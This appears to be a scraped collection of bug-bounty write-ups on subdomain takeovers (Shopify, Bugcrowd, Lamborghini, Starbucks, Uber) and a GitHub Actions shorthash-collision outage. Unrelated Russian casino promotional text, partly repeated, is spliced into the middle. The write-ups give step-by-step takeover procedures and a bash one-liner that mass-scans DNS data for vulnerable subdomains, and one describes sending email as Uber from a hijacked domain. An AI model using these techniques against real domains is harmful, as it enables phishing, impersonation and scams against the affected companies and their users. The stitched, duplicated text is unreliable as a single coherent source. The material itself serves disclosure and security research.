available shop name Example of available shop name If you take a look with Burp what is happening behind you can see a request to a rest API that can gives to you two types of responses: #1 Unavailable ({“status”:”unavailable”,”message”:null,”host”:”buckhacker.myshopify.com”}) #2 Available ({“status”:”available”,”message”:null,”host”:”buckhacker2.myshopify.com”}) You can develop a script that checks if a domain is available or not. To save you time we release a simple script on our GitHub page. At this point if we found that the shop name is available we need simply to connect it in the Shopify portal. Let’s take a look how to do it. Once you login in the shopify website go to the left menu on “Online Store” and then “Domains”: Domains Settings on the left menu Now click on “Connect existing domain”: In the next form write down the vulnerable domain: Press enter or click to view image in full size Click on “Next” and then “Verify Connection” Press enter or click to view image in full size Now if you performed all steps correctly you will be redirected to the following page: Press enter or click to view image in full size If you reached this point you have successfully performed a subdomain takeover. This case is more rare to find because you choose the shop name in the account creation procedure. So in order to have it available the user needs to delete the whole account or change it. During our investigation we identified that 2% of the websites were affected by this misconfiguration. Case #2 Mapping with DNS In the second case the subdomain is a CNAME pointing to shops.myshopify.com. Let’s look at this example that we created for this case: This is the most common case of subdomain takeover on Shopify. Basically in this case we can create a shop with any available name and just connect it from the Shopify portal as described in the previous case. Here some screenshots that illustrate the process: Connecting sales.buckhacker.com to my shop Here the confirmation: Successful connection of the vulnerable subdomain Another confirmation: Another confirmation Large scale exploitation We already told in previous articles how the project Sonar and the FDNS dataset is fantastic to identify vulnerabilities. Press enter or click to view image in full size FDNS Dataset The FDNS dataset provides, among other things, CNAMES records. Basically we can look inside this dataset all the subdomains with a CNAME pointing to shop.myshopify.com or myshopname.shopify.com and then perform the subdomain takeover check. Press enter or click to view image in full size subdomains of buckhacker.com in the FDNS Dataset All this could be done with our simple script and one line of bash: zcat $FDNS_DATASET | strings | grep shopify.com | cut -d “\\”” -f 8 | grep -v “shopify.com” | while read subdomain; do python3 ShopifySubdomainTakeoverCheck.py $subdomain; done First of all we need to explain why we have developed a new script to check for Subdomain Takeovers on Shopify when there are many already available. Most of the other scripts currently available, are detecting a Subdomain Takeover just based on the Shopify error message page, but, this could result in a lot of cases a false positive. We identified many pages with the “vulnerable” error message page, but just a small percentage of them was vulnerable to a Subdomain Takeover. Our simple script is performing three checks: page error message, CNAME and then, if needed, performs the REST API request (as described at the beginning of the blog post). We’ll hope in the next future Subdomain Takeover tools will implement similar techniques to reduce the number of false positives. If you use the script on all the FDNSv2 datasets (from the beginning of 2017 and with some additional tuning) the results are impressive: more then 55.000 subdomains are vulnerable to Subdomain Takeover. Now you can use this data and check if your BugBounty / Costumers domain names are present in this list. It is crystal clear that you can use this technique also on other cloud service providers. Conclusions We think this research could give a glimpse as to how large and underestimated the Subdomain Takeover phenomena is. We think, with cloud computing, we are in a new era of vulnerability research, instead of looking in process heap and stack we need to think in a large scale, for example by looking at DNS records mapping. Maybe we need to think about cloud platforms, and even the Internet itself, as a one big operating system. Hope you enjoyed this article; feedback is welcome !

Это делает игры доступными в любое время. Среди популярных слотов пользователи чаще выбирают Book of Ra от Novomatic и Mega Moolah от Microgaming. Критерии выбора надежного казино Чтобы обеспечить безопасность и прозрачность игры, нужно учитывать несколько ключевых параметров: Лицензия. Надежные площадки, такие как упомянутые выше, обычно имеют лицензии КРАИЛ или международные, например, от Malta Gaming Authority. Методы оплаты. Важны варианты пополнения и вывода средств, включая банковские карты, электронные кошельки и криптовалюты. Бонусы и акции. Платформы предлагают приветственные бонусы, фриспины и программы лояльности, привлекая новых игроков. Отзывы и репутация. Реальные отзывы помогают оценить качество сервиса. Техподдержка. Круглосуточная поддержка делает игру комфортной и безопасной. При выборе платформы стоит проверить каждый критерий, чтобы получить максимально позитивный опыт. Особенности украинских казино онлайн Украинские казино онлайн привлекают игроков благодаря разнообразию игр, гибким бонусным предложениям и прозрачному регулированию. Рассмотрим ключевые аспекты работы этих платформ. Законодательство и регулирование Украинское правительство активно регулирует рынок онлайн-гемблинга. С 2020 года казино обязаны получать лицензию Комиссии по регулированию азартных игр и лотерей (КРАИЛ). Лицензия подтверждает, что платформа соблюдает закон, использует сертифицированные игры и обеспечивает защиту данных игроков. Например, такие известные казино как Cosmolot и Parimatch успешно прошли лицензирование, гарантируя честность и прозрачность. Разнообразие игр Украинские казино отличаются широким выбором развлечений. Игровые автоматы занимают лидирующую позицию, предлагая тысячи вариантов с разными тематиками. В дополнение к слотам популярны рулетка, блэкджек, баккара и покер. Live-игры с реальными дилерами, представленные на платформах вроде Parimatch, создают атмосферу настоящего казино. Также отмечаем наличие джекпотов и турниров, стимулирующих азарт. Бонусы и акции Большинство украинских казино предоставляют привлекательные бонусы. Новички получают приветственные пакеты, такие как депозитные бонусы до 150% и бесплатные вращения на слотах. Постоянные игроки участвуют в программах лояльности, еженедельных акциях и турнирах. Cosmolot, например, известен ежедневными бонусами, а Slotoking продвигает систему кэшбэка. Эти предложения увеличивают шансы на выигрыш и повышают интерес пользователей. Методы платежей в украинских казино онлайн Онлайн-казино в Украине предлагают широкий выбор методов оплаты, чтобы удовлетворить запросы пользователей. Рассмотрим самые популярные варианты и их особенности. Популярные способы депозитов и выводов Мы отмечаем, что самые востребованные методы оплаты включают банковские карты Visa и Mastercard, которые обеспечивают надежность и быстроту транзакций. Также популярны электронные кошельки, такие как Monobank, Приват24 и Qiwi, благодаря удобству и моментальному зачислению средств. Множество казино поддерживают криптовалютные платежи (Bitcoin, Ethereum), что обеспечивает анонимность и высокую безопасность операций. Некоторые платформы предлагают прямые переводы через мобильных операторов, таких как Киевстар и Vodafone, что делает процесс особенно доступным для пользователей без банковских карт. Комиссии и скорость транзакций Размер комиссии зависит от выбранного метода. Обычно операции через банковские карты или электронные кошельки проходят без лишних сборов, тогда как криптовалютные переводы нередко включают сетевые комиссии. Мобильные платежи иногда сопровождаются небольшими дополнительными затратами со стороны оператора. Скорость обработки транзакций особенно важна для игроков. Депозиты через карты и электронные кошельки зачисляются мгновенно, тогда как вывод средств обычно занимает от 1 до 3 рабочих дней. Криптовалютные операции проходят быстрее, среднее время обработки редко превышает несколько часов. Преимущества и недостатки игр в украинских казино онлайн Украинские онлайн-казино предлагают множество игровых возможностей, но важно понимать как их преимущества, так и возможные ограничения. Рассмотрим обе стороны. Основные преимущества Доступность и удобство. Играть можно в любое время и из любого места, будь то смартфон, планшет или компьютер. Многие казино имеют мобильные приложения с адаптивным интерфейсом. Широкий выбор игр. Украинские платформы предлагают сотни слотов, настольных игр, рулеток и live-дилеров. Примеры популярных игр включают «Книга Ра», европейскую рулетку и блэкджек. Бонусные программы. Новые игроки получают приветственные бонусы, а постоянные — кэшбек, фриспины и регулярные акции. Такие игры, как в Cosmolot и Parimatch, часто сопровождаются ежедневными или персонализированными наградами. Безопасность транзакций. Лицензионные казино применяют шифрование данных и предлагают защищённые методы платежей, включая Visa, Приват24 и криптовалюты, что гарантирует безопасность финансовых операций. Правовая защита. С лицензией от КРАИЛ игроки защищены юридически, их данные хранятся в соответствии с украинскими законами. Возможные риски и ограничения Игровая зависимость. Некоторые пользователи могут столкнуться с аддикцией. Надёжные казино предлагают функцию самоисключения или лимитов для контроля. Финансовые потери. Азартные игры не гарантируют доход; ставки связаны с риском потерь. Ограничения доступа. Платформы с лицензией КРАИЛ доступны только пользователям из Украины, а иностранные казино могут быть заблокированы. Скорость вывода средств. В зависимости от метода платежей, процесс может занимать до 3 рабочих дней, что требует планирования. Блокировки и технические проблемы. Иногда из-за сбоев или интернет-ограничений доступ к платформам может быть временно недоступен. Мы всегда рекомендуем взвешивать преимущества и риски, чтобы делать ставки осознанно и получать только позитивные эмоции. Советы для новичков Новые игроки часто сталкиваются с трудностями из-за отсутствия опыта. Давайте разберёмся, как сделать старт в украинских онлайн-казино комфортным и безопасным. Как начать игру без ошибок Выбор лицензированного казино. Играть стоит только на платформах с лицензией КРАИЛ. Это гарантирует защиту данных и честные выплаты. Регистрация с корректными данными. Указываем только реальные данные: имя, дату рождения и контактную информацию, чтобы избежать проблем с выводом средств. Изучение правил игры. Читаем правила каждого автомата или стола, особенно перед ставками на реальные деньги. Это помогает понимать механику и избегать неоправданных потерь. Определение бюджета. Устанавливаем дневной или недельный лимит на ставки. Это предотвратит финансовые риски и сохранит положительные эмоции. Проверка отзывов. Читаем мнения пользователей об условиях вывода средств, поддержке и игровых автоматах. Частые ошибки игроков Игнорирование лицензии. Некоторые новички выбирают незарегистрированные казино из-за бонусов, что может привести к потере средств. Пренебрежение акциями. Игроки не используют приветственные бонусы или программы лояльности, хотя они увеличивают шансы на выигрыш. Отсутствие стратегии. Делать ставки хаотично — одна из типичных ошибок.

Примеры популярных игр включают «Книга Ра», европейскую рулетку и блэкджек. Бонусные программы. Новые игроки получают приветственные бонусы, а постоянные — кэшбек, фриспины и регулярные акции. Такие игры, как в Cosmolot и Parimatch, часто сопровождаются ежедневными или персонализированными наградами. Безопасность транзакций. Лицензионные казино применяют шифрование данных и предлагают защищённые методы платежей, включая Visa, Приват24 и криптовалюты, что гарантирует безопасность финансовых операций. Правовая защита. С лицензией от КРАИЛ игроки защищены юридически, их данные хранятся в соответствии с украинскими законами. Возможные риски и ограничения Игровая зависимость. Некоторые пользователи могут столкнуться с аддикцией. Надёжные казино предлагают функцию самоисключения или лимитов для контроля. Финансовые потери. Азартные игры не гарантируют доход; ставки связаны с риском потерь. Ограничения доступа. Платформы с лицензией КРАИЛ доступны только пользователям из Украины, а иностранные казино могут быть заблокированы. Скорость вывода средств. В зависимости от метода платежей, процесс может занимать до 3 рабочих дней, что требует планирования. Блокировки и технические проблемы. Иногда из-за сбоев или интернет-ограничений доступ к платформам может быть временно недоступен. Мы всегда рекомендуем взвешивать преимущества и риски, чтобы делать ставки осознанно и получать только позитивные эмоции. Советы для новичков Новые игроки часто сталкиваются с трудностями из-за отсутствия опыта. Давайте разберёмся, как сделать старт в украинских онлайн-казино комфортным и безопасным. Как начать игру без ошибок Выбор лицензированного казино. Играть стоит только на платформах с лицензией КРАИЛ. Это гарантирует защиту данных и честные выплаты. Регистрация с корректными данными. Указываем только реальные данные: имя, дату рождения и контактную информацию, чтобы избежать проблем с выводом средств. Изучение правил игры. Читаем правила каждого автомата или стола, особенно перед ставками на реальные деньги. Это помогает понимать механику и избегать неоправданных потерь. Определение бюджета. Устанавливаем дневной или недельный лимит на ставки. Это предотвратит финансовые риски и сохранит положительные эмоции. Проверка отзывов. Читаем мнения пользователей об условиях вывода средств, поддержке и игровых автоматах. Частые ошибки игроков Игнорирование лицензии. Некоторые новички выбирают незарегистрированные казино из-за бонусов, что может привести к потере средств. Пренебрежение акциями. Игроки не используют приветственные бонусы или программы лояльности, хотя они увеличивают шансы на выигрыш. Отсутствие стратегии. Делать ставки хаотично — одна из типичных ошибок. Лучше придерживаться стратегии и применять аналитику. Эмоциональные решения. Азарт часто мешает вовремя остановиться, что ведёт к превышению бюджета. Неправильный выбор игр. Игры без понимания коэффициентов выигрыша (RTP) могут принести меньше удовольствия и больше потерь.

Here’s the full content:\n\nBugcrowd’s Domain & Subdomain Takeover vulnerability! - Security Breached Blog Skip to content Security Breached Blog Hack Smart, Stay Safe: Comprehensive Guides to Cybersecurity and Bug Bounty October 10, 2017 Share BugBounty POC 3 Bugcrowd’s Domain & Subdomain Takeover vulnerability! by MuhammadKhizerJaved H ey, I decided to Write about this Issue because I have seen some people are still confused about “Fastly error: unknown domain” Many Subdomains of BugBounty programs have This error on their Subdomains and People Report is Without Claiming or Try to claim That.. But If you try to claim such Subdoamin it will ask U to add Main domain instead of subdomain… So back to the main story, last Sunday i decided to test Bugcrowd itself as it’s one of most secure BugBounty programs! While i was checking Reverse IP Lookup For bugcrowd.com I got these 2 results Reverse IP Lookup Results — 2 domains hosted on IP address 104.20.60.51 Domain View Whois Record Screenshots 1. bugcrowd.com 2. bugcrowdtrafficcontrol.com As I Frequently Visit bugcrowd.com The other domain bugcrowdtrafficcontrol.com was New for Me as I haven’t seen this domain I decided to Pay a Visit 😛 and I saw an error on the domain! Fastly error: unknown domain: bugcrowdtrafficcontrol.com. Please check that this domain has been added to a service. When I saw the error It suddenly clicks to my mind That I have seen such errors on subdomains of some websites but when I tried to takeover them via Fastly services They ask to add the main domain But in this case It was the main domain. So I checked the WHOis info for this domain and it was! Diagnostics DNS Records for bugcrowdtrafficcontrol.com Hostname Type TTL Priority Content bugcrowdtrafficcontrol.com SOA 1551 edna.ns.cloudflare.com [email protected] 2025379154 10000 2400 604800 3600 bugcrowdtrafficcontrol.com NS 86399 edna.ns.cloudflare.com bugcrowdtrafficcontrol.com NS 86399 lee.ns.cloudflare.com bugcrowdtrafficcontrol.com A 299 104.20.5.239 bugcrowdtrafficcontrol.com A 299 104.20.4.239 bugcrowdtrafficcontrol.com MX 299 5 alt2.aspmx.l.google.com bugcrowdtrafficcontrol.com MX 299 5 alt1.aspmx.l.google.com bugcrowdtrafficcontrol.com MX 299 1 aspmx.l.google.com bugcrowdtrafficcontrol.com MX 299 10 alt4.aspmx.l.google.com bugcrowdtrafficcontrol.com MX 299 10 alt3.aspmx.l.google.com www.bugcrowdtrafficcontrol.com A 299 104.20.60.51 www.bugcrowdtrafficcontrol.com A 299 104.20.61.51 www.bugcrowdtrafficcontrol.com AAAA 299 2400:cb00:2048:1::6814:3c33 www.bugcrowdtrafficcontrol.com AAAA 299 2400:cb00:2048:1::6814:3d33 www.bugcrowdtrafficcontrol.com CNAME 299 www.bugcrowd.com and this Information is Enough for Me to Confirm that the domain was indeed owned by Bugcrowd! TAKEOVER: W ell I opened My Fastly account and tried to make a Service named bugcrowdtrafficcontrol.com & With teh IP of the domain….., And Boom… It says! Your service has been created and activated. Domain 'bugcrowdtrafficcontrol.com' was created 2017-08-13 19:15 +00:00 by khizer Click the following link to see if your site is configured correctly: http://bugcrowdtrafficcontrol.com.global.prod.fastly.net. It may take up to a minute for your site to be ready. So Now as The domain is added to my account i visit the domain again an This time the error was changed to Error 503 hostname doesn't match against certificate hostname doesn't match against certificate Guru Mediation: Details: cache-cdg8721-CDG 1502652983 264973953 Varnish cache server the Error was same to My Fastly service URL http://bugcrowdtrafficcontrol.com.global.prod.fastly.net, The Error was generate due to My mistake… I’m unaware of how to use these services so a little messed Up! But i qucikly figured out that if i add the same service to my cloudfront account and change the Plan to Business (it cost upto 200$ ) You can gain Complete Access of the domain 🙂 Now if You remember the WHOis information showed me another thing The Subdomain www.bugcrowdtrafficcontrol.com When i visited that subdomain and It showed Me an error! Well as soon as i saw this error I remember that some days a go a guys published a Blog about taking over DonaldJTrump’s Website subdomain by same service and i tried to follow his steps But Unfortunately My card was declined while buying the services to Takeover the subdomain …. That’s Why I was Unable to takeover The Subdomain Completely! How to takeover: Signed up as client in Pantheon service. Created a Sandboxed domain as WordPress or Drupal. Added a credit card, then subscribed as ‘Professional’ to setup the sandboxed domain. Used a feature called “custom domains” to add the vulnerable subdomain to my account. Waited for the verification and building process to be finish. Boom You will be the admin of the subdomain So At the end I reported this To Bugcrowd! 😛 Because potentially the domain & Subdomain both was owned by Bugcrowd… Their Reply: The Report was Closed as N/A 😛 lol I was Hoping it to Be closed as Resolved 😛 But I still got 600$ 🙂 Thanks 🙂 Hope it will solve the problem for some about Fastly error 🙂 Share this: Click to share on X (Opens in new window) X Click to share on Facebook (Opens in new window) Facebook Click to share on LinkedIn (Opens in new window) LinkedIn Click to share on Reddit (Opens in new window) Reddit Click to share on Tumblr (Opens in new window) Tumblr Click to share on Telegram (Opens in new window) Telegram Click to share on WhatsApp (Opens in new window) WhatsApp Click to email a link to a friend (Opens in new window) Email Like this: Like Loading...

So I have to accept that I’m a Huge Fan of Lamborghini Cars 👊 So I was just looking at their website lamborghini.com when I decided to scan subdomains of the website 😛 and I found a Subdomain ( live.lamborghini.com) that was showing an error Like Cloudfront Error on live.lamborghini.com So as i Know and I hope most of You guys can recognize the ERROR^ so to be sure about the Subdomain Takeover Issue I checked the subdomain Both on http & https If u find the error on Both Then the subdomain is Probably Vulnerable to Subdomain Takeover Vulnerability! So let me start from basics What Basically is Subdomain Takeover Vulnerability? A subdomain takeover is considered a high severity threat and boils down to the registration of a domain by somebody else (with bad intentions) in order to gain control over one or more (sub)domains. This presents an interesting attack vector, which can even lead to several high severity risks, like authentication bypass etc. How it Works? A service named ‘Work’ on your website which located at work.mysite.com hosted at third party like bitbucket, AWS Cloudfront or Heroku and the CNAME Points at this url mysiteasset2015.heroku.com , and this service is not used on heroku , you just decided to use it and it expired or you did not claim it before but you added a dns entry pointing to heroku , so an attacker can claim it , then when you visit assets.mysite.com you are redirected to attacker site on heroku or show Mac Content by the attacker. So Back to the Story after confirming the Error on Both Http/Https i loged In to AWS account and Created a Bucket Named live.lamborghini.com and Uploaded an index.html file on it. Bucket Now After that I visited Cloudfront Distribution options and created a New Cloudfront Distribution I chooses the WEB option and In CNAME i added the link to the subdomain live.lamborghini.com Next i simple Linked my Distribution to my S3 bucket and tadaaa, Your Subdomain is Now Mine 😛 What can be the RISK of this Vulnerability! Somebody can make a Scam page and Scam users for BTC or any other instance on behalf of Lamborghini as its on the official website! I contacted Lamborghini Company about the issue As Soon as I got it & They act fastly to resolve the issue 🙂 Thanks for Reading!

{"source_url": "https://0xpatrik.com/subdomain-takeover-starbucks/", "title": "Subdomain Takeover: Starbucks points to Azure", "friendly_explanation": "This is a bug bounty writeup from https://0xpatrik.com/subdomain-takeover-starbucks/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nSubdomain Takeover: Starbucks points to Azure Patrik Hudak Subdomain Takeover: Starbucks points to Azure This post is the write-up about bug bounty report that I reported back in March 2018 to Starbucks. The report is now disclosed, and I was awarded $2,000 bounty. Although I have written about subdomain takeover in multiple posts , this case was somehow different. The domain in question was svcgatewayus.starbucks.com . The domain pointed to a non-existing resource in Microsoft Azure . I realized that I have never talked about Microsoft Azure as a potential vector for subdomain takeover. Firstly, Azure provides multiple services. I look for two primary services: Azure Websites — .azurewebsites.net Cloud Apps — .cloudapp.net The most significant difference compared to CloudFront and other similar services are, that Azure provides dedicated IP address to both of these services. The provided subdomain that points to it using A record. In other words, Azure doesn't utilize virtual hosts setup (as I described previously ). This means that for potential subdomain takeover, you only need to look for DNS status being NXDOMAIN . There are lots of misconceptions about when the subdomain takeover for Azure is possible. I recommend running a simple dig command: dig -t A DOMAIN_TO_CHECK Is the response status NXDOMAIN ? If yes, great, the takeover might be possible. Note that receiving 404 HTTP error does not mean the subdomain takeover is possible at all! As I said before, the services have dedicated VPS. For successful subdomain takeover, DNS request should always return NXDOMAIN . The subdomain in the report pointed to 1fd05821-7501-40de-9e44-17235e7ab48b.cloudapp.net . I needed to create a PoC which was a little bit tricky. The rough guideline of how I did it follows: Created a new Cloud Service in the portal . It asks for a custom domain name. Remember: This domain name needs to match since you are not dealing with virtual host anymore. You can confirm this theory by noticing that Cloud Service never asks for a domain name which you will use for CNAME . Created a Storage Account for the Cloud Service in the Azure portal. Azure requires a specific format for deployment of Cloud Services which is generated by Visual Studio. I created a simple ASP.NET web application and uploaded it to this Cloud Service using this tutorial. Because of DNS, the A record for svcgatewayus.starbucks.com is pointing to Azure, and so the HTTP request returns the content from the ASP.NET application I just deployed. For Azure Websites, the process is much more straightforward and looks closer to traditional PaaS. To create PoC for Azure Websites, I recommend the following this tutorial. I tested that, and it works correctly. I have to say that I find the Azure portal very messy. IMHO it is a lot more complex than AWS with no significant benefits. Azure offers several other services with a different structure, subdomains, and PoC process that I will cover in one of the future posts. Follow me on Twitter to get it first. Until next time!

It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nSubdomain Takeover: Yet another Starbucks case Patrik Hudak Subdomain Takeover: Yet another Starbucks case Recently, I was repeatedly awarded $2,000 bounty for subdomain takeover on Starbucks . You may remember my post about bug bounty report where I described how to subdomain takeover was possible using Azure. This case was pretty similar. However, I had to use another Azure service called Traffic Manager . In this post, I explain the step-by-step process for the proof of concept. On Monday evening, I noticed that wfmnarptpc.starbucks.com responds with NXDOMAIN . The more interesting fact was that it has CNAME set to s00149tmppcrpt.trafficmanager.net . From experience, I knew that this has a perfect chance of being a subdomain takeover. As you may remember, Azure mostly uses dedicated IP addresses, so when CNAME to Azure responds with NXDOMAIN , your bug bounty radar should be on. Previously, I haven't mentioned that trafficmanager.net is also one of the domains where subdomain takeover is possible. Let's look at what is Traffic Manager about: \"Microsoft Azure Traffic Manager allows you to control the distribution of user traffic for service endpoints in different datacenters. [...] You can also use Traffic Manager with external, non-Azure endpoints.\" $ dig a wfmnarptpc.starbucks.com ; <<>> DiG 9.10.6 <<>> a wfmnarptpc.starbucks.com ;; global options: +cmd ;; Got answer: ;; ->>HEADER<<- opcode: QUERY, status: NXDOMAIN, id: 20251 ;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL: 1 ;; OPT PSEUDOSECTION: ; EDNS: version: 0, flags:; udp: 4096 ;; QUESTION SECTION: ;wfmnarptpc.starbucks.com. IN A ;; ANSWER SECTION: wfmnarptpc.starbucks.com. 33165 IN CNAME s00149tmppcrpt.trafficmanager.net. Simply put, there is some domain which has link to non-existing subdomain of trafficmanager.net . To prove our point, we need to registered the previously removed asset in Azure. Thankfully (for us), Azure is not doing any domain ownership verification :-) You may remember that this situation is still not the winning point since there might be disabled configuration with this subdomain in Azure. In this case, even though externally it seems that takeover is possible, PoC creation would fail. I started by creating a new Traffic Manager profile in the Azure portal: Nice! At this point, I knew that the subdomain takeover is possible. The s00149tmppcrpt.trafficmanager.net is available; I can take it and progress with PoC. Now I needed to point the domain to one of the servers that I own: The only thing left was to create a new virtual host on my endpoint: Time well spent. Thank you very much. Until next time!

For Further Impact identification @uranium238 Gave some ideas related to Google G-suite verification, As You know Google Gsuite need to verify a domain before giving access to the app and an attacker can send an receive emails as Uber using *.uber.design subdomains By simply following these steps. Steps: 1) Register a domain as admin.uber.design 2) Create a Google G-suite account as [email protected] 3) verify the domain by Uploading HTML to domain via Github 4) After verification i’m able to send and receive emails as [email protected] also As The Domain is Owned by the attacker he can further use if for any miscellaneous purposes, he can add a site on google sites and can also b used as a Scam site. Well after that, I reported the issue to Uber. but after reporting i turned to the other subdomains and only one subdomain www.uber.design was legit and all Other subdomain were vulnerable to takeover, Basically as heroku wildcard is Opened and i can register any subdomain.

It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nHow I accidentally took down GitHub Actions | Teddy Katz’s Blog Teddy Katz's Blog About How I accidentally took down GitHub Actions Nov 12, 2019 Last December, I was invited to a private bug bounty program to test a beta version of GitHub Actions . GitHub Actions is a workflow automation tool integrated with GitHub. One common use case of GitHub Actions is for CI builds – a project can fairly easily start up a Docker container every time they push a commit (e.g.), and run their project’s tests in the container. At the time, I wasn’t too familiar with the details of how GitHub Actions worked, so I decided to just try it out and see what would happen. I used GitHub’s configuration wizard to create a config file. First, it let me select from a list of triggers for the Action (“do something when a commit is pushed”, “do something when someone creates an issue”, etc). I selected “do something when a comment is added to an issue”. Next, it gave a list of options for what should happen when the trigger activates, which mainly consisted of different cloud services/containers (“Run something on AWS”, “Run code in Docker”, etc.). I selected “Run code in Docker” and specified that the file ./foo.sh in the repository should be executed. The config wizard created the following file for me (comments added here for explanation): workflow \"New workflow\" { resolves = [ \"GitHub Action for Docker\" ] on = \"issue_comment\" # When someone leaves an issue comment in this repo, } action \"GitHub Action for Docker\" { uses = \"actions/docker/cli@76ff57a\" # Set up a Docker container, runs = \"./foo.sh\" # ...and run `foo.sh` in this repo. } Sure enough, when I committed that file to the repository and added a comment to an issue, it started a build that executed foo.sh in a Docker container. I was a bit confused about the uses = \"actions/docker/cli@76ff57a\" line in the config file, so I looked at the build log. Near the top of the log, I saw that the build had downloaded and unzipped a tarball from https://api.github.com/repos/actions/docker/tarball/76ff57a . Eventually, I figured out that: https://github.com/actions/docker was a repository containing integration code for GitHub Actions in a directory called cli . (Unfortunately, it seems to have been deleted sometime in the last year.) 76ff57a was the most recent commit hash on master for the actions/docker repository. That commit hash was auto-inserted by the config wizard when I created the config file. So the runner for GitHub Actions would see the string actions/docker/cli@76ff57a in the config file, and then parse out the individual components: it would clone the actions/docker repository at commit 76ff57a , enter the cli directory, and execute some setup code located there. The commit hash 76ff57a got my attention, because it was an abbreviated commit shorthash (only 7 hex characters) rather than a full commit hash (40 hex characters). Commit Hash Collisions A commit hash is a pseudorandom 40-character hex string that identifies a git commit. An example of a commit hash is 76ff57a6c3d817840574a98950b0c7bc4e8a13a8 . Since a string that long can be unwieldy, git sometimes shows an abbreviated commit hash (sometimes called a “shorthash”) consisting of the first seven characters of the full commit hash. This is why GitHub generated the string 76ff57a in my config file. Commit shorthashes have a major problem: As a repository accumulates a large number of commits, eventually it will contain two commit hashes that start with the same seven characters (and have the same shorthash). After this happens, tools that use shorthashes will start to break because the commit shorthash is ambiguous (it’s no longer a pointer to a single commit). Due to the birthday problem , any repository that has at least 19291 commits is likely to have a pair of ambiguous commits somewhere. So if we waited for the actions/docker repo to have tens of thousands of commits, one of the shorthashes would eventually become ambiguous and break someone’s build. Commit Hash Collisions, Faster I didn’t really feel like waiting for a low-activity repo to accumulate tens of thousands of commits. Luckily, we only have to wait that long if commit hashes are generated pseudorandomly. If we’re creating commits while trying to generate collisions, then it’s a lot easier – we can just create a single commit, then keep amending the commit message locally until it creates a commit hash that we want. By coincidence, I had created a tool a couple years earlier that does exactly this as a practical joke. So I cloned the actions/docker repo (which had 76ff57a6c3d817840574a98950b0c7bc4e8a13a8 as the latest commit), created a new commit with some changes, and ran the tool. Two minutes later, I had different commit ( 76ff57aa21370794040cd0caafd84d8a7aa0927c ) that also had the shorthash 76ff57a . To get the collision to affect anything on GitHub, I needed to push it to the actions/docker repo. This posed a problem, because I didn’t have write access to the actions/docker repo. However, I realized I could get around that issue by forking the actions/docker repo and pushing a commit to my fork (since GitHub shares commits between forks and parent repositories). GitHub Actions vs. Commit Hash Collisions So I created a fork and pushed my commit to it. I wasn’t quite sure what GitHub would do if someone tried to download https://api.github.com/repos/actions/docker/tarball/76ff57a when the hash 76ff57a was ambiguous. My best guess was that it would just pick one of the commits (either the original commit from actions/docker , or my new duplicate commit). Instead, that URL just started returning a 404 error, causing my Actions build (and also everyone else’s build that used the latest commit from actions/docker ) to break. So the good news was that I’d found a security issue which could allow any GitHub user to DoS GitHub Actions builds globally. The bad news was that I’d accidentally just DoSed a part of GitHub Actions globally. I had considered that this might happen, so I was ready to delete my fork as soon as I pushed the commit. (I thought deleting the fork would remove the ambiguity and cause everyone’s builds to start working again.) Unfortunately, even after I deleted my fork, the tarball URL still returned a 404, meaning that I’d accidentally broken everyone’s builds with no way to fix them. Oops. (In hindsight, I should have been more careful here. I could have tested out the tarball behavior on a test repo before using actions/docker . Luckily, at this point GitHub Actions was still in very early beta, so I’m hoping not too many people were affected.) Anyway, I pinged someone on GitHub’s security team about the issue. After a few minutes, they were able to get the outage fixed by running a pass of git garbage collection . The root cause was fixed a few weeks later by updating the config wizard to generate full 40-character commit hashes in config files. Takeaways on Commit Shorthashes This issue has had an effect on how I use commit shorthashes to refer to commits generally, when accounting for the possibility that someone could maliciously generate shorthash collisions. Shorthashes can safely be used for: Identifying commits now or in the very near future (e.g. asking someone to take a look at your commit in the next few minutes) Displaying commit hashes to users, if the full commit hash is also included somewhere. (For example, it’s okay to show a shorthash as the visible text in a link, as long as the target URL of the link includes the full 40-character hash). Shorthashes should not be used to identify commits for any extended period of time. This includes: Build scripts (use full 40-character hashes instead) Links in documentation (you can still use shorthashes for display if the full hash is included in the link target) Again, the risk is that if you include a shorthash in your build script, any random troll (or careless security researcher) could decide to break your build script by generating a different commit with the same shorthash, and pushing it to a fork. This issue would be somewhat mitigated if commit hashes on GitHub weren’t shared with forks. (As such, the risk is smaller for private repositories.) However, even if that were the case, someone without write access could still subtly introduce a collision by getting a PR accepted, or a shorthash could become ambiguous by chance over time. Personally, I think it’s better to just always follow the advice above to avoid a potential headache later. Making every shorthash collide Finally, I thought it would be funny to create a git branch that uses every 7-character commit shorthash (so every other commit in that repository would be guaranteed to have a shorthash collision). Surprisingly, this is feasible. There are 16 7 total 7-character commit shorthashes, so by the coupon collector’s problem , we would need to hash something like 28 ⋅ 16 7 ≈ 7.5 billion test commits. This would take about 90 minutes on my laptop. In terms of storage space, the smallest git commit is about 175 bytes before compression, so the repository would weigh in at around (175 bytes) ⋅ 16 7 ≈ 47 GB. Unfortunately, 47 GB is more space than I have left on my hard drive, so I didn’t go through with this. However, 47 GB is within GitHub’s 100GB hard limit on repo size . I can imagine an attack scenario where someone creates that branch once, and then just forks a bunch of popular repos and pushes the same branch to all of the forks, breaking all shortlinks in the documentation/build scripts of lots of repos at once. (Please don’t actually do this – it probably violates GitHub’s ToS, and it’s possible GitHub has some protection against it anyway.) Update, several years later: I went ahead and implemented a proof-of-concept for this idea . In total it’s only 24GB, but pushing it to GitHub would probably be a tall order. Timeline (Some of these times are approximate due to limited logs/information from a year later.) 2018-12-19, around 22:00:00 UTC: I pushed a new 76ff57a commit to my fork of actions/docker , inadvertently causing builds to start breaking. (about a minute later): I deleted my fork of actions/docker in an unsuccessful attempt to fix the broken builds. 2018-12-19 22:09:33 UTC: I pinged someone from GitHub’s security team in a Slack that had been set up for the private bounty program. 2018-12-19 22:13:08 UTC: Initial response from GitHub on Slack. A short discussion about the issue ensued. 2018-12-19, around 22:45:00 UTC: GitHub ran GC on the actions/docker repo, which cleaned up the commit from my fork and resolved the immediate outage. 2018-12-19 22:53:46 UTC: Follow-up report about the issue submitted on HackerOne 2018-12-19 23:11:30 UTC: Initial response from GitHub on HackerOne 2019-01-04 00:20:13 UTC: $5000 bounty awarded from GitHub on HackerOne. Root cause fix was WIP at this point. (Sometime in the following week): GitHub Actions config wizard updated to include full 40-character commit hash in generated config files, rather than 7-character shorthash.

